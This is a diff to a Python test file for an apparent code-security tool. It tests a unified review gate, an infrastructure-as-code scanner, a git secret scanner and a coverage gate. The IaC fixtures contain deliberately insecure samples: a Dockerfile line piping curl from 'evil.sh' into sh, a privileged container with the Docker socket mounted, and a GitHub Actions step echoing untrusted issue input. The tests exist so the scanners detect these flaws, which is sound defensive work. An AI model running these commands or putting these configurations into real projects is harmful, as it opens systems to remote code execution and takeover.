@@ -19,13 +19,14 @@ def _node(
     end: int,
     kind: Literal["function", "endpoint"] = "function",
     decorators=None,
+    file_path: str = "app.py",
 ) -> Node:
     return Node(
         id=nid,
         name=name,
         qualified_name=name,
         kind=kind,
-        file_path="app.py",
+        file_path=file_path,
         start_line=start,
         end_line=end,
         decorators=decorators,
@@ -335,8 +336,10 @@ def test_language_aware_rule_filtering_and_initial_seed(tmp_path) -> None:
     assert any(r.id == "js:CWE-1321-prototype-pollution" for r in poly_rules)
 
 
-def test_unified_review_gate(tmp_path) -> None:
-    """Verifies run_unified_review combines Security, Split Audit, and Caller Guard."""
+def test_unified_review_gate(tmp_path, monkeypatch) -> None:
+    """Verifies run_unified_review and cmd_review combine Security, Split Audit, and Coverage."""
+    import argparse
+    from vibetrace.cli_audit import cmd_review
     from vibetrace.services.review_service import format_unified_review_md, run_unified_review
 
     (tmp_path / "app.py").write_text("import os\ndef bad(x):\n    os.system(x)\n", encoding="utf-8")
@@ -351,3 +354,124 @@ def test_unified_review_gate(tmp_path) -> None:
     assert any("[SECURITY:CRITICAL]" in a for a in rep.actions_required)
     md = format_unified_review_md(rep)
     assert "ACTION REQUIRED" in md
+
+    monkeypatch.setattr(
+        "vibetrace.cli_audit.get_context_for_path", lambda *a, **kw: (db, str(tmp_path))
+    )
+    rc = cmd_review(
+        argparse.Namespace(
+            path=str(tmp_path),
+            full=True,
+            deps=False,
+            ci=True,
+            json=True,
+            no_sync=True,
+            root=None,
+            min_coverage=None,
+            strict=False,
+        )
+    )
+    assert rc == 1
+
+
+def test_iac_scanner_docker_compose_gha(tmp_path) -> None:
+    """Verifies zero-dependency IaC scanner catches Dockerfile, Compose, and GHA defects."""
+    from vibetrace.security.iac_scanner import IacScanner
+
+    (tmp_path / "Dockerfile").write_text(
+        "FROM python:latest\nENV API_SECRET=super_secret_val_123\n"
+        "RUN curl -fsSL https://evil.sh | sh\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "docker-compose.yml").write_text(
+        "services:\n  app:\n    privileged: true\n"
+        "    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n",
+        encoding="utf-8",
+    )
+    gha = tmp_path / ".github" / "workflows"
+    gha.mkdir(parents=True, exist_ok=True)
+    (gha / "ci.yml").write_text(
+        "jobs:\n  build:\n    steps:\n      - run: echo ${{ github.event.issue.title }}\n",
+        encoding="utf-8",
+    )
+
+    findings = IacScanner.scan_project(tmp_path)
+    rule_ids = {f.rule_id for f in findings}
+    assert "iac:dockerfile-unpinned-image" in rule_ids
+    assert "iac:dockerfile-env-secret" in rule_ids
+    assert "iac:dockerfile-curl-pipe-sh" in rule_ids
+    assert "iac:dockerfile-missing-user" in rule_ids
+    assert "iac:container-privileged-mode" in rule_ids
+    assert "iac:docker-socket-mount" in rule_ids
+    assert "iac:github-actions-untrusted-input" in rule_ids
+
+
+def test_git_secret_entropy_scanner() -> None:
+    """Verifies Gitleaks-style token format and Shannon entropy detection in git patches."""
+    from vibetrace.security.git_secret_scanner import GitSecretScanner, shannon_entropy
+
+    assert shannon_entropy("aB3$xZ9!qW7#mP2@kL5^vN8&tR4*yU1") >= 4.3
+    patch = (
+        "diff --git a/src/config.py b/src/config.py\n"
+        "+++ b/src/config.py\n"
+        "@@ -1,0 +1,2 @@\n"
+        "+AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
+        "+api_secret = 'xK9pQ2mZ8vL4nB7wR1tY6uJ3hG5fD0sA'\n"
+    )
+    findings = GitSecretScanner._scan_patch_text(patch, "working-tree")
+    rules = {f.rule_id for f in findings}
+    assert "git:leaked-api-token" in rules
+    assert "git:high-entropy-secret" in rules
+    # Ensure raw secret is masked in snippet
+    for f in findings:
+        assert "AKIAIOSFODNN7EXAMPLE" not in (f.non_compliant_snippet or "")
+
+
+def test_hybrid_coverage_quality_gate(tmp_path) -> None:
+    """Verifies AST test-caller reachability and Cobertura coverage.xml Quality Gate."""
+    from vibetrace.services.coverage_service import CoverageService
+
+    ctx = tmp_path / ".vibetrace"
+    ctx.mkdir(parents=True, exist_ok=True)
+    db = IndexerDB(str(ctx / "vibetrace.db"))
+
+    # 2 production functions, 1 test calling fn_tested
+    db.upsert_node(_node("f1", "fn_tested", 1, 5, file_path="src/core.py"))
+    db.upsert_node(_node("f2", "fn_untested", 7, 12, file_path="src/core.py"))
+    db.upsert_node(_node("t1", "test_core_flow", 1, 8, file_path="tests/test_core.py"))
+    db.upsert_edge(Edge(from_node_id="t1", to_node_id="f1", relation_type="calls"))
+
+    gate = CoverageService.evaluate_coverage_gate(
+        db=db,
+        project_root=tmp_path,
+        scope="full",
+        changed_files=set(),
+        file_ranges={},
+        min_coverage=80.0,
+        enforce=True,
+    )
+    assert gate.total_target_symbols == 2
+    assert gate.tested_symbols_count == 1
+    assert gate.ast_symbol_coverage_pct == 50.0
+    assert not gate.passed
+    assert [u.symbol for u in gate.untested_symbols] == ["fn_untested"]
+
+    # Now add a Cobertura coverage.xml with 100% line hits -> hybrid coverage passes!
+    (tmp_path / "coverage.xml").write_text(
+        '<coverage><packages><package><classes><class filename="src/core.py">'
+        '<lines><line number="1" hits="3"/><line number="8" hits="2"/></lines>'
+        "</class></classes></package></packages></coverage>",
+        encoding="utf-8",
+    )
+    gate2 = CoverageService.evaluate_coverage_gate(
+        db=db,
+        project_root=tmp_path,
+        scope="full",
+        changed_files=set(),
+        file_ranges={},
+        min_coverage=80.0,
+        enforce=True,
+    )
+    assert gate2.line_coverage_pct == 100.0
+    assert gate2.effective_coverage_pct == 100.0
+    assert gate2.passed
